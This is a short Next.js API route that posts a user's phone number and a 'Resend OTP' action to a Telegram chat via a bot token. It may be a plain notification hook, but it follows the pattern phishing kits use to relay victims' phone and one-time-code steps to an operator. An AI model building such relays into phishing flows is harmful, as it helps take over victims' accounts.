import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const { phoneNumber } = await request.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials not configured');
      return NextResponse.json(
        { error: 'Telegram not configured' },
        { status: 500 }
      );
    }

    const message = `
🔔 **Resend OTP**

📱 Phone Number: ${phoneNumber}
📋 Action: Resend otp
⏰ Timestamp: Now
    `;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message.trim(),
        parse_mode: 'Markdown',
      }),
    });

    if (!response.ok) {
      const error = await response.json();
      console.error('Telegram API error:', error);
      return NextResponse.json(
        { error: 'Failed to send message' },
        { status: response.status }
      );
    }

    const result = await response.json();
    return NextResponse.json({ success: true, messageId: result.result.message_id });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
